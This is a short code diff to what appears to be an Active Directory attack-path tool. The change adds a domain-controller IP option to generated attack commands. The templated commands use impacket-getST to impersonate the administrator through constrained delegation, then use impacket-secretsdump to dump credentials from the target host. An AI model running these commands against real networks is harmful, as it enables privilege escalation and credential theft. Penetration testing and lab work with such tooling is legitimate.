@@ -661,6 +661,7 @@ def run(report, store, ui=None):
                     best_src, best_line = _s, _l
                     break
             _dom_c = store.dominant_domain() or "<dom>"
+            _dc_c = store.dc_ip() or "<DC>"
             # First target SPN for the sample command
             first_spn = spns[0] if spns else "cifs/<target>.<dom>"
             # iter-49: SPN format is 'class/host[/port_or_path]' - grab the
@@ -675,8 +676,10 @@ def run(report, store, ui=None):
                 crit=8, conf=0.9, ready=1.4, prox=0.95,           # score 9.58
                 commands=[
                     f"# {ulc} is trusted to delegate to {len(spns)} SPN(s)",
+                    # iter-60: -dc-ip anchors KDC discovery on lab boxes
+                    # without functional DNS resolution.
                     f"impacket-getST -spn '{first_spn}' -impersonate administrator "
-                    f"'{_dom_c}/{ulc}:{pw}'",
+                    f"-dc-ip {_dc_c} '{_dom_c}/{ulc}:{pw}'",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
                     f"'{_dom_c}/administrator@{_spn_host}'",
